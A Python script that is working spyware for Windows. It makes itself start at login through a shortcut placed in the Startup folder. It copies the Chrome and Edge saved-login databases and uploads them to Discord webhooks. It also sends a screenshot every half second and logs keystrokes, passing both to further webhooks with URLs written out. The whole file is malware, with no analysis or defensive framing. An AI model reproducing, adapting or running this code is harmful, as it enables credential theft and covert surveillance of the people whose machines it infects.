for i in range(2):
    try:
        import subprocess
        from time import sleep
        from pyautogui import *
        import getpass
        from discord_webhook import *
        import pyshortcuts
        import threading
    except:
        subprocess.run(["pip","install","pyautogui"])
        subprocess.run(["pip","install","pyshortcuts"])
        subprocess.run(["pip","install","discord_webhook"])
chats = ''
pichook = 'https://discord.com/api/webhooks/1048313483227303987/Tc2zTnlNOlyDlcnW3JngqqSVL9PsuO5AT6CTOfWCzs1Jaf246z9N-lKPkkClgAe2b841'
pinghook = 'https://discord.com/api/webhooks/1048321898280398890/y9FByrN2zrXhaAN2c6mhYYHIrLouLJ-8pLUZAwzP56QQze1EDRWFZx3ZcK13va9qAvLn'
keyhook = 'https://discord.com/api/webhooks/1048322117516656780/f98ZO3WcghPWgXQpijUSHVr0G8xG-7DrxkstrgBhDvcN6SPDN96CjTlNrKyjHXzror9E'
passhook = 'https://discord.com/api/webhooks/1048322208109428796/hQ3bm18HzZfg9-qJX1DXsOJWUMo8aqoEELHaWcrtQlWYjlDcKuFsfJbx1KY7hf2BweVY'

def spiderman():
    global pichook
    global pinghook
    global passhook
    #path = "C:\\Users\\" + getpass.getuser() +  "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
    path2 = "C:\\Users\\" + getpass.getuser()
    path3 = "C:\\Users\\" + getpass.getuser() +  "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"

    if getpass.getuser() != 'spide':
#        try:
#            files = os.listdir("data\\replacement")
#            error = False
#        except:
#            error = True                  old code lolol
#        if not error:
#            for i in files:
#                shutil.copy('data\\replacement\\'+i,path+i)
        pyshortcuts.make_shortcut(os.getcwd()+"\\data\\replacement\\Dev.vbs",name="autostart",folder=path3,terminal=False,desktop=False,startmenu=False,executable="Dev.vbs")

    stats = 0
    cppath = path2 + r"\AppData\Local\Google\Chrome\User Data\Default\Login Data"
    try:
        chook = DiscordWebhook(url=passhook)
        with open(cppath,"rb") as f:
            chook.add_file(file=f.read(),filename='CLogin Data')
        chook.execute(remove_files=True)
    except:
        nopp = True
    try:
        eppath = path2 + r"\AppData\Local\Microsoft\Edge\User Data\Default\Login Data"
        ehook = DiscordWebhook(url=passhook)
        with open(eppath, "rb") as f:
            ehook.add_file(file=f.read(), filename='ELogin Data')
        ehook.execute(remove_files=True)
    except:
        nopp = True

    thehook = pichook
    pingus = DiscordWebhook(url=pinghook, content=f'Hello, <@&1048313691495485460>! {getpass.getuser()} started the program!')
    pingus.execute(remove_embeds=True, remove_files=True)
    webhook = DiscordWebhook(url=thehook)
    while 1:
        screenshot(path2+"\\ss.png")
        with open(path2+"\\ss.png", "rb") as f:
            webhook.add_file(file=f.read(), filename='ss.png')
        embed = DiscordEmbed(title='title', description='desc', color='0000FF')
        embed.set_thumbnail(url='attachment://ss.png')
        try:
            response = webhook.execute(remove_embeds=True, remove_files=True)
            print(response,str(response)[11:14])
            if str(response)[11:14] == "429":
                sleep(2)
                print("slep")
            if stats > 0:
                pingus.set_content(str(stats),"times not connected, but now back, <@&1048313691495485460>")
                pingus.execute()

                stats = 0
        except:
            stats += 1
        sleep(0.5)
def keylag():
    global chats
    global keyhook
    from pynput.keyboard import Key, Listener
    #import logging
    def send(string):
        global chats
        webhook.set_content("|"+str(string)+"|")
        webhook.execute()
        chats = ''
    thekook = keyhook
    #logging.basicConfig(filename=("keys.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
    webhook = DiscordWebhook(url=thekook)
    def press(k):
        #logging.info(str(k))
        global chats
        k = str(k)
        chats += k
        if len(chats) >= 100:
            chats = chats.replace("Key.space", " ")
            chats = chats.replace("Key.bacchatsspace", "BCK")
            chats = chats.replace("Key.ctrl_l", "LCTRL")
            chats = chats.replace("Key.ctrl_r", "RCTRL")
            chats = chats.replace("Key.shift", "SHFT")
            chats = chats.replace("Key.shift_r", "RSHFT")
            chats = chats.replace("'", "")
            if len(chats) >= 70:
                send(chats)

    with Listener(on_press=press) as listener:
        listener.join()

t1 = threading.Thread(target=spiderman)
t2 = threading.Thread(target=keylag)

t1.start()
t2.start()